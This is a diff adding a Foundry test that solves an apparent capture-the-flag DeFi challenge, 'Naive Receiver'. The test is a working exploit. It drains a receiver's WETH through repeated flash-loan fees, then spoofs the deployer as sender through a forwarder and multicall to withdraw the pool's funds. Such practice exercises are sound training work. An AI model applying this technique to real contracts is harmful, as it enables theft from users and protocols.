@@ -77,7 +77,45 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Give the player 10 ether
+        deal(player, 10 ether);
+        // Call 10 times the pool flashloan function with the receiver and 0 amount just to pay the fee (1weth)
+        // Goal is to ""waste"" all the receiver weth into fees and withdraw them
+        bytes[] memory dataForMultiCall = new bytes[](11);
+
+        // console.log(dataForMultiCall.length);
+        for (uint256 i = 0; i < dataForMultiCall.length - 1; i++) {
+            dataForMultiCall[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 1 ether, bytes("")));
+        }
+
+        // Forwarder
+        uint256 toWithdraw = WETH_IN_POOL + WETH_IN_RECEIVER;
+
+        bytes memory dataPool = abi.encodeCall(pool.withdraw, (toWithdraw, payable(recovery)));
+
+        dataForMultiCall[10] = abi.encodePacked(dataPool, abi.encode(deployer));
+        bytes memory data = abi.encodeCall(pool.multicall, (dataForMultiCall));
+
+        // Make ready the request
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0 ether,
+            gas: 3000000,
+            nonce: forwarder.nonces(player),
+            data: data,
+            deadline: block.timestamp + 60
+        });
+
+        // Signature for the Execute action
+        bytes32 messageHash =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, messageHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        bool sucess = forwarder.execute(request, signature);
+
+        console.log("Balance of weth in pool", weth.balanceOf(address(pool)));
     }
 
     /**
